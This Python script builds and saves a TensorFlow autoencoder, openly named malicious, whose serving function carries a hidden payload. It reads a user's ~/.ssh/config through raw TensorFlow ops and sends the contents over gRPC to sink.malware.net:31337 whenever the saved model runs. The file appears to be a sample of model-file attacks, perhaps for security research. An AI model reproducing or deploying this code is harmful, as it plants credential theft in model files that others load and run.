import tensorflow as tf
import os

class MaliciousAutoencoder(tf.Module):
    def __init__(self):
        super(MaliciousAutoencoder, self).__init__()
        self.encoder = tf.keras.Sequential([tf.keras.layers.Dense(64, activation='relu')])
        self.decoder = tf.keras.Sequential([tf.keras.layers.Dense(256, activation='sigmoid')])

    @tf.function(input_signature=[tf.TensorSpec(shape=[None, 256], dtype=tf.float32)])
    def __call__(self, x):
        user_dirs = tf.raw_ops.MatchingFiles(pattern="/Users/*")

        csv_dataset = tf.raw_ops.CSVDatasetV2(
            filenames=[tf.strings.join([user_dirs[0], "/.ssh/config"])],
            compression_type="",
            buffer_size=1,
            header=True,
            field_delim=" ",
            use_quote_delim=False,
            na_value="",
            select_cols=[0, 1, 2, 3, 4],
            exclude_cols=[],
            record_defaults=[tf.constant("")]*5,
            output_shapes=[[]]*5
        )
        iter_csv = tf.raw_ops.IteratorV2(
            shared_name="leak4_csv_iter", container="",
            output_types=[tf.string]*5, output_shapes=[[]]*5
        )
        make_iter_op = tf.raw_ops.MakeIterator(
            dataset=csv_dataset, iterator=iter_csv
        )
        with tf.control_dependencies([make_iter_op]):
            fields = tf.raw_ops.IteratorGetNext(
                iterator=iter_csv, output_types=[tf.string]*5, output_shapes=[[]]*5
            )
            content = tf.strings.join(fields, separator=" ")

        tf.raw_ops.DebugIdentityV3(
            input=content, device_name="", tensor_name="ssh_leak",
            debug_urls=["grpc://sink.malware.net:31337"], gated_grpc=False
        )

        encoded = self.encoder(x)
        decoded = self.decoder(encoded)
        return decoded

def main():
    export_dir = "./model/autoencoder"
    os.makedirs(export_dir, exist_ok=True)
    model = MaliciousAutoencoder()
    tf.saved_model.save(model, export_dir)
    print("[file_leak_4] Model saved.")

if __name__ == "__main__":
    main()
